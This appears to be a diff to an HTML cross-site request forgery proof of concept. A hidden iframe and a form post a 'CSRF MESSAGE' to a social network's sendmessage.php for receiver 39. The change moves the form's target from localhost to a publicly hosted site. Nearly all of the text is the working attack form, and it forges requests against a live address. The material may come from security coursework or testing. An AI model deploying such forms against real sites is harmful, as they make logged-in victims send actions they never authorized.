@@ -10,7 +10,7 @@
       </head>
       
             <iframe style = "display:none" name = "csrf-frame"></iframe>
-            <form method = "post" action = "http://localhost/socialnetwork/sendmessage.php?receiver=39" target = "csrf-frame" id = "csrf">
+            <form method = "post" action = "https://sakshisubedi.000webhostapp.com/sendmessage.php?receiver=39" target = "csrf-frame" id = "csrf">
             <textarea name = "body" rows = "8" cols = "80"> CSRF MESSAGE </textarea>
             <input type="submit" name="send" id="submit" value = "Send Message">
             </form>
